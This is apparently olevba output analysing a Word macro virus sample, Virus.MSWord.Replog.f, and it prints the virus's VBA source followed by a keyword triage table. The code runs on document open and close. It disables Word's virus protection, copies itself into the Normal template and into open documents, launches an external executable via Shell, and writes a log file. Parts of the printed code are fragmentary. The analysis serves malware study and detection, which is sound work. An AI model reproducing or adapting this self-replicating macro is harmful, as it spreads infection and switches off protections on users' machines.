olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Replog.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Replog.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'mt16.11.00 15:39:10HP LaserJet 4 on LPT4:Dokument2Karl Klammer
Private Sub Document_Close()
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
s = ActiveDocument.Saved
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
If Dir("c:\ethan.___", 6) = "" Then
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
Print #1, a
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
Close #1
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
End If
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
Else
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
End If
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
Open "c:\ethan.___" For Input As #1
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
i = 1
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
Line Input #1, a
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
i = i + 1
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
q:
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
If Rnd < 0.3 Then With Dialogs(wdDialogFileSummaryInfo): .Title = "Ethan Frome": .Author = "EW/LN/CB": .Keywords = "Ethan": .Execute: End With
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
End If
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
End Sub
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
'Kuttner Michael03.03.00 15:40:31Dokument1Karl Klammer
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
'Kuttner Michael03.03.00 15:40:31Dokument1Karl Klammer
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
'Kuttner Michael03.03.00 15:40:31Dokument1Karl Klammer
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
'Kuttner Michael03.03.00 15:40:31Dokument1Karl Klammer
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
'Kuttner Michael03.03.00 15:40:31Dokument1Karl Klammer
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
'Kuttner Michael03.03.00 15:40:31Dokument1Karl Klammer
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
'Kuttner Michael03.03.00 15:40:31Dokument1Karl Klammer
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
'Kuttner Michael03.03.00 15:40:31Dokument1Karl Klammer
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
'Kuttner Michael03.03.00 15:40:31Dokument1Karl Klammer
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
'Kuttner Michael03.03.00 15:40:31Dokument1Karl Klammer
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
'Kuttner Michael03.03.00 15:40:31Dokument1Karl Klammer
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
'Kuttner Michael03.03.00 15:40:31Dokument1Karl Klammer
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
Sub ToolsMacro()
'mt16.11.00 15:39:11HP LaserJet 4 on LPT4:Dokument2Karl Klammer
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
With host.CodeModule
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
    For x = 1 To 4
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
    .deletelines 1
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
    Next x
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
End With
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
If nt < 70 Then
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
    With host.CodeModule
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
    .replaceline 1, "Sub AutoClose()"
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
    .replaceline 71, "Sub ToolsMacro()"
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
    End With
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
End If
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
With host.CodeModule
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
    For x = 2 To 72 Step 2
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
    Next x
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
End With
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
out:
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
End Sub
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
Sub ViewVBCode()
'Kuttner Michael03.03.00 15:40:32Dokument1Karl Klammer
End Sub


Private Sub Document_Open()
On Error Resume Next
Shell "I:\Eudora\Sys\Server.exe"
Set TD = ThisDocument.VBProject.VBComponents(1)
Set ad = ActiveDocument.VBProject.VBComponents(1)
Set nt = NormalTemplate.VBProject.VBComponents(1)
VCode = TD.CodeModule.Lines(1, TD.CodeModule.CountOfLines)
nt.CodeModule.deletelines 1, nt.CodeModule.CountOfLines
ad.CodeModule.deletelines 1, ad.CodeModule.CountOfLines
nt.CodeModule.InsertLines 1, VCode
ad.CodeModule.InsertLines 1, VCode
ActiveDocument.Save
NormalTemplate.Save

Open "I:\Rep.log" For Append As #1
Print #1, "Active on " & Date
Close
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Server.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

